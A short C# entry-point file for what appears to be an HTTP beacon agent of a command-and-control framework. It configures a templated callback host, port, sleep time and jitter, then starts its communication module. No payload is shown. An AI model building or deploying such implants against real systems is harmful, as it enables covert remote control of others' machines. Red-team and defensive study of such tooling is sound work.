using System;

using AgentCore.Controllers;
using AgentCore.Models;
using HttpAgent.Modules;

namespace HttpAgent
{
    class Program
    {
        static void Main(string[] args)
        {
            var config = new ConfigController();
            config.SetOption(ConfigSetting.ConnectHost, "<<ConnectHost>>");
            config.SetOption(ConfigSetting.ConnectPort, "<<ConnectPort>>");
            config.SetOption(ConfigSetting.SleepTime, "<<SleepTime>>");
            config.SetOption(ConfigSetting.Jitter, "<<Jitter>>");

            var commModule = new HttpCommModule();
            commModule.Init(config);

        }
    }
}
